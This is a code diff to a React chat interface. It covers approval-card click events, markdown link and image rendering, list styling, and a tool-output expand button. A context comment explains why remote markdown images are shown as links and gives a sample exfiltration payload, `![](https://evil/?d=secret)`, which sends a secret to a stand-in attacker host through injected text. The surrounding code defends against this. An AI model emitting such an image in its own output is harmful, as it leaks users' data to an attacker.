@@ -442,8 +442,9 @@ export interface ApprovalActionCardProps {
   declineLabel?: string;
   allowCustomFeedback?: boolean;
   feedbackPlaceholder?: string;
-  onAccept: (feedback?: string) => void;
-  onDecline: (feedback?: string) => void;
+  /** `event`: the button's click, so a caller can tell a tap from a key press */
+  onAccept: (feedback?: string, event?: React.MouseEvent<HTMLButtonElement>) => void;
+  onDecline: (feedback?: string, event?: React.MouseEvent<HTMLButtonElement>) => void;
   isSubmitting?: boolean;
   className?: string;
 }
@@ -463,12 +464,12 @@ export const ApprovalActionCard: React.FC<ApprovalActionCardProps> = ({
   const [feedback, setFeedback] = useState("");
   const [showFeedbackInput, setShowFeedbackInput] = useState(false);
 
-  const handleConfirm = () => {
-    onAccept(feedback.trim() ? feedback.trim() : undefined);
+  const handleConfirm = (event: React.MouseEvent<HTMLButtonElement>) => {
+    onAccept(feedback.trim() ? feedback.trim() : undefined, event);
   };
 
-  const handleDecline = () => {
-    onDecline(feedback.trim() ? feedback.trim() : undefined);
+  const handleDecline = (event: React.MouseEvent<HTMLButtonElement>) => {
+    onDecline(feedback.trim() ? feedback.trim() : undefined, event);
   };
 
   return (
@@ -705,7 +706,11 @@ export function chatMarkdownUrlTransform(url: string, key: string): string {
  * lets injected text exfiltrate data through the URL (`![](https://evil/?d=secret)`). A remote
  * image is therefore drawn as a link showing its alt text and host that the reader taps to open.
  */
+/** Set by markdown `a` overrides: an image inside a link must not render a second, nested anchor. */
+export const MarkdownLinkContext = React.createContext(false);
+
 export const ChatMarkdownImage: React.FC<{ src?: string; alt?: string }> = ({ src, alt }) => {
+  const insideLink = React.useContext(MarkdownLinkContext);
   if (typeof src === "string" && INLINE_MARKDOWN_IMAGE.test(src)) {
     return <img src={src} alt={alt ?? ""} loading="lazy" className="my-1 max-w-full rounded-md" />;
   }
@@ -726,7 +731,7 @@ export const ChatMarkdownImage: React.FC<{ src?: string; alt?: string }> = ({ sr
   const className =
     "inline-flex items-center gap-1 rounded border border-chat-border bg-chat-surface/70 px-1.5 py-0.5 text-xs text-chat-foreground-secondary";
   const icon = <ImageIcon aria-hidden="true" className="size-3 shrink-0" />;
-  return href ? (
+  return href && !insideLink ? (
     <a
       data-testid="markdown-remote-image"
       href={href}
@@ -761,7 +766,7 @@ const REFERENCE_PROSE_COMPONENTS = {
       rel="noopener noreferrer"
       className="text-chat-link underline underline-offset-2 decoration-chat-link/60 hover:decoration-chat-link"
     >
-      {children}
+      <MarkdownLinkContext.Provider value={true}>{children}</MarkdownLinkContext.Provider>
     </a>
   ),
   pre: ({ children }: any) => (
@@ -775,6 +780,8 @@ const REFERENCE_PROSE_COMPONENTS = {
     </code>
   ),
   img: ChatMarkdownImage,
+  ul: ({ children }: any) => <ul className="list-disc pl-4 mb-2 space-y-1">{children}</ul>,
+  ol: ({ children }: any) => <ol className="list-decimal pl-4 mb-2 space-y-1">{children}</ol>,
 };
 
 /** Markdown the page already carries, drawn the way the rest of the chat draws prose. */
@@ -1085,7 +1092,9 @@ export const ReferenceToolPartCard: React.FC<{
   const [expanded, setExpanded] = useState(false);
   const images = part.images ?? [];
   const outputRef = part.outputRef ?? null;
-  const canExpand = Boolean(part.input || part.output || images.length > 0 || outputRef);
+  const onRequestWholeOutput = context?.onRequestWholeOutput;
+  const canRequestWholeOutput = outputRef !== null && onRequestWholeOutput !== undefined;
+  const canExpand = Boolean(part.input || part.output || images.length > 0 || canRequestWholeOutput);
   const loading = outputRef !== null && context?.loadingOutputRef === outputRef;
   const firstLine = part.input.trim().split("\n")[0] ?? "";
 
@@ -1134,12 +1143,12 @@ export const ReferenceToolPartCard: React.FC<{
           ))}
         </div>
       )}
-      {outputRef !== null && (
+      {canRequestWholeOutput && (
         <button
           type="button"
           data-testid="reference-tool-whole-output"
           disabled={loading}
-          onClick={() => context?.onRequestWholeOutput?.(outputRef)}
+          onClick={() => onRequestWholeOutput(outputRef)}
           className="rounded-md border border-chat-border bg-chat-surface-raised px-2 py-1 text-[11px] text-chat-foreground-secondary hover:text-chat-foreground disabled:opacity-60 focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring"
         >
           {loading
